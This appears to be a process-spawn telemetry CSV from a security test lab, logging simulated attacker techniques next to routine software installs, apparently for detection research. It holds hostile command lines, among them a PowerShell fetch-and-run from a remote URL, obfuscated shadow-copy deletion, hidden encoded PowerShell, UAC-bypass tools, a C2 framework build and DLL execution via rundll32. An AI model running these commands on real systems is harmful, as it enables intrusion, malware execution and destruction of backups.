Source,Target,Type,Weight,Commands
proc::c:/windows/hh.exe,proc::c:/windows/system32/windowspowershell/v1.0/powershell.exe,spawned,10,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -WindowStyle Hidden -EncodedCommand CgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAJwAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAnACwAJwBIAGkAZABkAGUAbgAnACwAJwAtAE4AbwBQAHIAbwBmAGkAbABlACcALAAnAC0AQwBvAG0AbQBhAG4AZAAnACwAKAAnAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAnACAAKwAgACgARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJABFAG4AdgA6AHcAaQBuAGQAaQByAFwAVABlAG0AcABcAEkAbgB2AG8AawBlAEMASABNAFQAZQBzAHQARwB1AGkAZAAuAHQAeAB0ACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACkAKQAKAA== | ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -WindowStyle Hidden -EncodedCommand CgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAJwAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAnACwAJwBIAGkAZABkAGUAbgAnACwAJwAtAE4AbwBQAHIAbwBmAGkAbABlACcALAAnAC0AQwBvAG0AbQBhAG4AZAAnACwAKAAnAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAnACAAKwAgACgARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJABFAG4AdgA6AHcAaQBuAGQAaQByAFwAVABlAG0AcABcAEkAbgB2AG8AawBlAEMASABNAFQAZQBzAHQARwB1AGkAZAAuAHQAeAB0ACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACkAKQAKAA== | ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -WindowStyle Hidden -EncodedCommand CgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAJwAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAnACwAJwBIAGkAZABkAGUAbgAnACwAJwAtAE4AbwBQAHIAbwBmAGkAbABlACcALAAnAC0AQwBvAG0AbQBhAG4AZAAnACwAKAAnAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAnACAAKwAgACgARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJABFAG4AdgA6AHcAaQBuAGQAaQByAFwAVABlAG0AcABcAEkAbgB2AG8AawBlAEMASABNAFQAZQBzAHQARwB1AGkAZAAuAHQAeAB0ACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACkAKQAKAA== | ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -WindowStyle Hidden -EncodedCommand CgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAJwAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAnACwAJwBIAGkAZABkAGUAbgAnACwAJwAtAE4AbwBQAHIAbwBmAGkAbABlACcALAAnAC0AQwBvAG0AbQBhAG4AZAAnACwAKAAnAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAnACAAKwAgACgARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJABFAG4AdgA6AHcAaQBuAGQAaQByAFwAVABlAG0AcABcAEkAbgB2AG8AawBlAEMASABNAFQAZQBzAHQARwB1AGkAZAAuAHQAeAB0ACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACkAKQAKAA== | ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -WindowStyle Hidden -EncodedCommand CgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAJwAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAnACwAJwBIAGkAZABkAGUAbgAnACwAJwAtAE4AbwBQAHIAbwBmAGkAbABlACcALAAnAC0AQwBvAG0AbQBhAG4AZAAnACwAKAAnAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAnACAAKwAgACgARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJABFAG4AdgA6AHcAaQBuAGQAaQByAFwAVABlAG0AcABcAEkAbgB2AG8AawBlAEMASABNAFQAZQBzAHQARwB1AGkAZAAuAHQAeAB0ACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACkAKQAKAA=="
proc::c:/windows/hh.exe,proc::c:/windows/system32/cmd.exe,spawned,1,"""C:\Windows\System32\cmd.exe"" /c calc.exe"
proc::c:/windows/temp/notepad.exe,proc::c:/windows/system32/windowspowershell/v1.0/powershell.exe,spawned,4,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -WindowStyle Hidden -EncodedCommand CgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAJwAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAnACwAJwBIAGkAZABkAGUAbgAnACwAJwAtAE4AbwBQAHIAbwBmAGkAbABlACcALAAnAC0AQwBvAG0AbQBhAG4AZAAnACwAKAAnAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAnACAAKwAgACgARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJABFAG4AdgA6AHcAaQBuAGQAaQByAFwAVABlAG0AcABcAEkAbgB2AG8AawBlAEMASABNAFQAZQBzAHQARwB1AGkAZAAuAHQAeAB0ACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACkAKQAKAA== | ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -WindowStyle Hidden -EncodedCommand CgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAJwAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAnACwAJwBIAGkAZABkAGUAbgAnACwAJwAtAE4AbwBQAHIAbwBmAGkAbABlACcALAAnAC0AQwBvAG0AbQBhAG4AZAAnACwAKAAnAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAnACAAKwAgACgARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJABFAG4AdgA6AHcAaQBuAGQAaQByAFwAVABlAG0AcABcAEkAbgB2AG8AawBlAEMASABNAFQAZQBzAHQARwB1AGkAZAAuAHQAeAB0ACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACkAKQAKAA== | ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -WindowStyle Hidden -EncodedCommand CgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAJwAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAnACwAJwBIAGkAZABkAGUAbgAnACwAJwAtAE4AbwBQAHIAbwBmAGkAbABlACcALAAnAC0AQwBvAG0AbQBhAG4AZAAnACwAKAAnAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAnACAAKwAgACgARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJABFAG4AdgA6AHcAaQBuAGQAaQByAFwAVABlAG0AcABcAEkAbgB2AG8AawBlAEMASABNAFQAZQBzAHQARwB1AGkAZAAuAHQAeAB0ACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACkAKQAKAA== | ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -WindowStyle Hidden -EncodedCommand CgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAJwAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAnACwAJwBIAGkAZABkAGUAbgAnACwAJwAtAE4AbwBQAHIAbwBmAGkAbABlACcALAAnAC0AQwBvAG0AbQBhAG4AZAAnACwAKAAnAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAnACAAKwAgACgARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJABFAG4AdgA6AHcAaQBuAGQAaQByAFwAVABlAG0AcABcAEkAbgB2AG8AawBlAEMASABNAFQAZQBzAHQARwB1AGkAZAAuAHQAeAB0ACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACkAKQAKAA=="
proc::c:/temp/notepad.exe,proc::c:/windows/system32/windowspowershell/v1.0/powershell.exe,spawned,3,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -Command Write-Host 709e55a1-0ea3-4b31-91f6-147a690f20f4; Start-Sleep -Seconds 2; exit | ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -Command Write-Host c0ea733d-d021-4ce6-b62e-0c76740c3751; Start-Sleep -Seconds 2; exit | ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -Command Write-Host 0a1004e8-372c-4edb-af5e-773830c2fa81; Start-Sleep -Seconds 2; exit"
proc::c:/windows/microsoft.net/framework/v4.0.30319/regasm.exe,proc::c:/windows/syswow64/calc.exe,spawned,3,calc.exe | calc.exe | calc.exe
proc::c:/windows/microsoft.net/framework/v4.0.30319/regsvcs.exe,proc::c:/windows/syswow64/calc.exe,spawned,2,calc.exe | calc.exe
proc::c:/temp/notregasm.exe,proc::c:/windows/syswow64/calc.exe,spawned,1,calc.exe
proc::c:/temp/notregsvcs.exe,proc::c:/windows/syswow64/calc.exe,spawned,1,calc.exe
proc::c:/programdata/chocolatey/lib/sysinternals/tools/psexec.exe,proc::c:/windows/syswow64/cmd.exe,spawned,4,"""cmd.exe"" /c C:\windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe | ""cmd.exe"" /c C:\windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe | ""cmd.exe"" /c C:\Temp\notregasm.exe | ""cmd.exe"" /c C:\Temp\notregsvcs.exe"
proc::c:/programdata/chocolatey/bin/psexec.exe,proc::c:/programdata/chocolatey/lib/sysinternals/tools/psexec.exe,spawned,4,"""C:\ProgramData\chocolatey\lib\sysinternals\tools\PsExec.exe"" cmd.exe /c C:\windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe | ""C:\ProgramData\chocolatey\lib\sysinternals\tools\PsExec.exe"" cmd.exe /c C:\windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe | ""C:\ProgramData\chocolatey\lib\sysinternals\tools\PsExec.exe"" cmd.exe /c C:\Temp\notregasm.exe | ""C:\ProgramData\chocolatey\lib\sysinternals\tools\PsExec.exe"" cmd.exe /c C:\Temp\notregsvcs.exe"
proc::c:/windows/syswow64/regsvr32.exe,proc::c:/windows/syswow64/calc.exe,spawned,3,"""C:\Windows\System32\calc.exe""  | ""C:\Windows\System32\calc.exe""  | ""C:\Windows\System32\calc.exe"" "
proc::c:/temp/notregsvr32.exe,proc::c:/windows/system32/calc.exe,spawned,2,"""C:\Windows\System32\calc.exe""  | ""C:\Windows\System32\calc.exe"" "
proc::c:/windows/system32/diskshadow.exe,proc::c:/windows/system32/calc.exe,spawned,1,c:\windows\system32\calc.exe
proc::c:/program files (x86)/gotoassist remote support expert/1702/g2ax_comm_expert.exe,proc::c:/program files (x86)/gotoassist remote support expert/1702/g2ax_session_expert.exe,spawned,1,"""C:\Program Files (x86)\GoToAssist Remote Support Expert\1702\g2ax_session_expert.exe"" ""StartID={1C2D72B0-71DD-421F-9133-4B43EFFEB937}&ResourceDll=g2ax_expert_resource_win32_x86_en_US.dll&Debug=On&Stat=On&StatDb=On&Index=1"""
proc::c:/program files (x86)/gotoassist remote support expert/1702/g2ax_comm_expert.exe,proc::c:/program files (x86)/gotoassist remote support expert/1702/g2ax_user_expert.exe,spawned,1,"""C:\Program Files (x86)\GoToAssist Remote Support Expert\1702\g2ax_user_expert.exe"" ""StartID={B32A708B-A5D4-4B29-AF98-600B48A630A9}&ResourceDll=g2ax_expert_resource_win32_x86_en_US.dll&Debug=On&Stat=On&StatDb=On&Index=0"""
proc::c:/users/admini~1/appdata/local/temp/2/01628ea9/gotoassist.exe,proc::c:/windows/syswow64/cmd.exe,spawned,1,"C:\Windows\system32\cmd.exe /c """"C:\Users\ADMINI~1\AppData\Local\Temp\2\A6A035DE-0900-4D1A-A7C1-A8BFE9843A68.bat"" ""C:\Users\Administrator\Downloads\GoToAssist.exe"""""
proc::c:/users/admini~1/appdata/local/temp/2/01628ea9/gotoassist.exe,proc::c:/users/administrator/appdata/local/gotoassist remote support expert/g2ax_expert_combined_dll_core_win32_x86_1702.exe,spawned,1,"""C:\Users\Administrator\AppData\Local\GoToAssist Remote Support Expert\g2ax_expert_combined_dll_core_win32_x86_1702.exe"" ""/Action Default"" ""/Build 1702"" ""/Debug On"" ""/EGWAddress 3.218.246.74,52.55.102.23"" ""/EGWDNS egw1.express.gotoassist.com"" ""/EGWPort 8200,80,443"" ""/Language en_US"" ""/LogLevel Normal"" ""/ResourceDll g2ax_expert_resource_win32_x86_en_US.dll"" ""/ServiceAllowed Yes"" ""/StartAsService Yes"" ""/Stat On"" ""/StatDb On"" ""/UninstallService No"" ""/colClientUiReadyEvent Global\1BEAAE5C-6062-416B-91AC-20CA32C440A3"" ""/locale en_US"" ""/sessionTrackingId e0-FaCddxmtMoX8_cY4czssnTeGvy83i"""
proc::c:/users/admini~1/appdata/local/temp/2/01628ea9/gotoassist.exe,proc::c:/windows/syswow64/msiexec.exe,spawned,1,"""C:\Windows\system32\msiexec.exe"" /i ""C:\Users\ADMINI~1\AppData\Local\Temp\2\0953541C-2AC0-4E4D-BC31-B86C69242E7B\GoToOpener.msi"" /q /lvx ""C:\Users\ADMINI~1\AppData\Local\Temp\2\LogMeInLogs\GoToOpenerMsi\4EC14CB9-AF76-43FF-8902-F8B6E3628BE1.log"""
proc::c:/program files (x86)/gotoassist remote support expert/1702/g2ax_start.exe,proc::c:/program files (x86)/gotoassist remote support expert/1702/g2ax_comm_expert.exe,spawned,1,"""C:\Program Files (x86)\GoToAssist Remote Support Expert\1702\g2ax_comm_expert.exe"" ""Action=Default&Build=1702&colClientUiReadyEvent=Global\1BEAAE5C-6062-416B-91AC-20CA32C440A3&Debug=On&Digest=71c703ea85154a4e246a04c6b40dedc1&EGWAddress=3.218.246.74,52.55.102.23&EGWDNS=egw1.express.gotoassist.com&EGWPort=8200,80,443&Language=en_US&LoaderPath=C:\Program Files (x86)\GoToAssist Remote Support Expert\1702\g2ax_start.exe&locale=en_US&LogLevel=Normal&LogName=C:\Users\ADMINI~1\AppData\Local\Temp\2\LogMeInLogs\GoToAssist Remote Support Expert\1702\20220823_035236\GoToAssist Remote Support Expert.log&LogPath=C:\Users\ADMINI~1\AppData\Local\Temp\2\LogMeInLogs\GoToAssist Remote Support Expert\1702\20220823_035236\&ResourceDll=g2ax_expert_resource_win32_x86_en_US.dll&RestartReason=Start&ServiceAllowed=Yes&sessionTrackingId=e0-FaCddxmtMoX8_cY4czssnTeGvy83i&StartAsService=Yes&Stat=On&StatDb=On&UninstallService=No&UniqueId=2710"""
proc::c:/users/admini~1/appdata/local/temp/2/logmeininc/gotoassist remote support expert/1702/g2a9754.tmp/g2ax_installerexpert.exe,proc::c:/program files (x86)/gotoassist remote support expert/1702/g2ax_start.exe,spawned,1,"""C:\Program Files (x86)\GoToAssist Remote Support Expert\1702\g2ax_start.exe"" ""/Action Default"" ""/Build 1702"" ""/Debug On"" ""/EGWAddress 3.218.246.74,52.55.102.23"" ""/EGWDNS egw1.express.gotoassist.com"" ""/EGWPort 8200,80,443"" ""/Language en_US"" ""/LoaderPath C:\Users\Administrator\AppData\Local\GoToAssist Remote Support Expert\g2ax_expert_combined_dll_core_win32_x86_1702.exe"" ""/LogLevel Normal"" ""/LogPath C:\Users\ADMINI~1\AppData\Local\Temp\2\LogMeInLogs\GoToAssist Remote Support Expert\1702\20220823_035236\"" ""/ResourceDll g2ax_expert_resource_win32_x86_en_US.dll"" ""/RestartReason Start"" ""/ServiceAllowed Yes"" ""/StartAsService Yes"" ""/Stat On"" ""/StatDb On"" ""/UninstallService No"" ""/colClientUiReadyEvent Global\1BEAAE5C-6062-416B-91AC-20CA32C440A3"" ""/locale en_US"" ""/sessionTrackingId e0-FaCddxmtMoX8_cY4czssnTeGvy83i"""
proc::c:/users/administrator/appdata/local/gotoassist remote support expert/g2ax_expert_combined_dll_core_win32_x86_1702.exe,proc::c:/users/admini~1/appdata/local/temp/2/logmeininc/gotoassist remote support expert/1702/g2a9754.tmp/g2ax_installerexpert.exe,spawned,1,"""C:\Users\ADMINI~1\AppData\Local\Temp\2\LogMeInInc\GoToAssist Remote Support Expert\1702\g2a9754.tmp\g2ax_installerexpert.exe "" ""/Action Default"" ""/Build 1702"" ""/Debug On"" ""/EGWAddress 3.218.246.74,52.55.102.23"" ""/EGWDNS egw1.express.gotoassist.com"" ""/EGWPort 8200,80,443"" ""/Language en_US"" ""/LoaderPath C:\Users\Administrator\AppData\Local\GoToAssist Remote Support Expert\g2ax_expert_combined_dll_core_win32_x86_1702.exe"" ""/LogLevel Normal"" ""/LogPath C:\Users\ADMINI~1\AppData\Local\Temp\2\LogMeInLogs\GoToAssist Remote Support Expert\1702\20220823_035236\"" ""/ResourceDll g2ax_expert_resource_win32_x86_en_US.dll"" ""/RestartReason Start"" ""/ServiceAllowed Yes"" ""/StartAsService Yes"" ""/Stat On"" ""/StatDb On"" ""/UninstallService No"" ""/colClientUiReadyEvent Global\1BEAAE5C-6062-416B-91AC-20CA32C440A3"" ""/locale en_US"" ""/sessionTrackingId e0-FaCddxmtMoX8_cY4czssnTeGvy83i"""
proc::c:/users/administrator/downloads/gotoassist.exe,proc::c:/users/admini~1/appdata/local/temp/2/01628ea9/gotoassist.exe,spawned,1,"""C:\Users\Administrator\Downloads\GoToAssist.exe"" /S  ""/initialPath C:\Users\Administrator\Downloads\GoToAssist.exe"""
proc::c:/users/administrator/downloads/anydesk.exe,proc::c:/users/administrator/downloads/anydesk.exe,spawned,2,"""C:\Users\Administrator\Downloads\AnyDesk.exe"" --local-control | ""C:\Users\Administrator\Downloads\AnyDesk.exe"" --local-service"
proc::c:/users/administrator/downloads/dcrypt.exe,proc::c:/users/admini~1/appdata/local/temp/2/is-rr4d9.tmp/dcrypt.tmp,spawned,1,"""C:\Users\ADMINI~1\AppData\Local\Temp\2\is-RR4D9.tmp\dcrypt.tmp"" /SL5=""$2D0144,1206527,119296,C:\Users\Administrator\Downloads\dcrypt.exe"" "
proc::c:/users/admini~1/appdata/local/temp/2/is-rr4d9.tmp/dcrypt.tmp,proc::c:/program files/dcrypt/dcinst.exe,spawned,1,"""C:\Program Files\dcrypt\dcinst.exe"" -setup"
proc::c:/windows/system32/inetsrv/w3wp.exe,proc::c:/windows/system32/cmd.exe,spawned,2,C:\Windows\system32\cmd.exe /C nslookup | C:\Windows\system32\cmd.exe /C quser
proc::c:/program files/microsoft/exchange server/v15/bin/microsoft.exchange.diagnostics.service.exe,proc::c:/windows/system32/relog.exe,spawned,2,"""relog.exe"" ""C:\Program Files\Microsoft\Exchange Server\V15\Logging\Diagnostics\PerformanceLogsToBeProcessed\ExchangeDiagnosticsPerformanceLog_03120407.blg"" -f csv -o ""C:\Program Files\Microsoft\Exchange Server\V15\Logging\Diagnostics\PerformanceLogsToBeProcessed\ExchangeDiagnosticsPerformanceLog_03120407.csvtmp"" -y | ""relog.exe"" ""C:\Program Files\Microsoft\Exchange Server\V15\Logging\Diagnostics\PerformanceLogsToBeProcessed\ExchangeDiagnosticsPerformanceLog_03120412.blg"" -f csv -o ""C:\Program Files\Microsoft\Exchange Server\V15\Logging\Diagnostics\PerformanceLogsToBeProcessed\ExchangeDiagnosticsPerformanceLog_03120412.csvtmp"" -y"
proc::c:/program files/microsoft/exchange server/v15/bin/msexchangehmworker.exe,proc::c:/windows/system32/cmd.exe,spawned,3,"""cmd"" /c nslookup.exe -type=SRV _ldap._tcp.attackrange.local win-dc-293.attackrange.local | ""cmd"" /c nltest /dclist: | ""cmd"" /c nltest.exe /dsgetdc:"
proc::c:/mets.exe,proc::c:/windows/system32/rundll32.exe,spawned,1,rundll32.exe
proc::c:/program files/dotnet/dotnet.exe,proc::c:/program files/dotnet/dotnet.exe,spawned,1,"""dotnet.exe"" exec ""C:\Program Files\dotnet\sdk\3.1.410\MSBuild.dll"" -maxcpucount -verbosity:m -restore C:\Users\Administrator\Covenant\Covenant\Covenant.csproj -nologo -verbosity:quiet ""-distributedlogger:Microsoft.DotNet.Tools.MSBuild.MSBuildLogger,C:\Program Files\dotnet\sdk\3.1.410\dotnet.dll*Microsoft.DotNet.Tools.MSBuild.MSBuildForwardingLogger,C:\Program Files\dotnet\sdk\3.1.410\dotnet.dll"""
proc::c:/program files/dotnet/dotnet.exe,proc::c:/users/administrator/covenant/covenant/bin/debug/netcoreapp3.1/covenant.exe,spawned,1,"""C:\Users\Administrator\Covenant\Covenant\bin\Debug\netcoreapp3.1\Covenant.exe"""
proc::c:/temp/release/x64/x64dbg.exe,proc::c:/temp/akagi64.exe,spawned,1,"""C:\Temp\Akagi64.exe"" 43"
proc::c:/windows/system32/fodhelper.exe,proc::c:/windows/system32/cmd.exe,spawned,2,"""C:\Windows\System32\cmd.exe""  | ""C:\Windows\System32\cmd.exe"" "
proc::c:/windows/system32/cleanmgr.exe,proc::c:/users/admini~1/appdata/local/temp/6af9c314-069d-4590-9a0f-7150a71aa8f1/dismhost.exe,spawned,1,C:\Users\ADMINI~1\AppData\Local\Temp\6AF9C314-069D-4590-9A0F-7150A71AA8F1\dismhost.exe {0B110B20-DB9C-4E09-9922-52B90F4DCFD6}
proc::c:/windows/system32/cleanmgr.exe,proc::c:/users/admini~1/appdata/local/temp/28bcb6c9-d54c-4681-abb0-940e81a362fa/dismhost.exe,spawned,1,C:\Users\ADMINI~1\AppData\Local\Temp\28BCB6C9-D54C-4681-ABB0-940E81A362FA\dismhost.exe {4E7B5E36-370C-474C-B190-523006628FB1}
proc::c:/temp/darkside.exe,proc::c:/windows/system32/windowspowershell/v1.0/powershell.exe,spawned,1,"powershell -ep bypass -c ""(0..61)|%%{$s+=[char][byte]('0x'+'4765742D576D694F626A6563742057696E33325F536861646F77636F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.Substring(2*$_,2))};iex $s"""
proc::c:/users/administrator/downloads/release/x32/x32dbg.exe,proc::c:/temp/darkside.exe,spawned,1,"""C:\Temp\darkside.exe"""
proc::c:/windows/psexesvc.exe,proc::c:/windows/system32/cmd.exe,spawned,1,"""cmd"" "
proc::c:/windows/system32/runas.exe,proc::c:/windows/system32/cmd.exe,spawned,1,cmd.exe
proc::c:/users/administrator/documents/7z.exe,proc::c:/windows/system32/conhost.exe,spawned,3,\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1 | \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
proc::c:/temp/winrar.exe,proc::c:/program files/winrar/th.exe,spawned,1,"""C:\Program Files\WinRAR\th.exe"" -lng English -src wrr -lp thankyou -ver 580 -arch 64 -dom notifier.win-rar.com /S"
proc::c:/temp/winrar.exe,proc::c:/program files/winrar/uninstall.exe,spawned,1,"""C:\Program Files\WinRAR\uninstall.exe"" /setup"
proc::c:/program files/winrar/th.exe,proc::c:/windows/system32/cmd.exe,spawned,1,"C:\Windows\system32\cmd.exe /c """"C:\Users\ADMINI~1\AppData\Local\Temp\2\_uninsep.bat"" """
proc::c:/program files/microsoft office/root/office16/excel.exe,proc::c:/windows/system32/rundll32.exe,spawned,2,"rundll32 ..\Holed.fisk,StartW | rundll32 ..\Holed.fisk,StartW"
proc::c:/program files/microsoft office/root/office16/excel.exe,proc::c:/windows/splwow64.exe,spawned,1,C:\Windows\splwow64.exe 12288
proc::c:/program files/microsoft office/root/office16/excel.exe,proc::c:/windows/system32/windowspowershell/v1.0/powershell.exe,spawned,1,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/dragonstail_benign.ps1')"
proc::c:/program files/microsoft office/root/office16/excel.exe,proc::c:/windows/system32/cscript.exe,spawned,1,"""C:\Windows\system32\cscript.exe"" C:\programdata\asc.txt:script1.vbs"
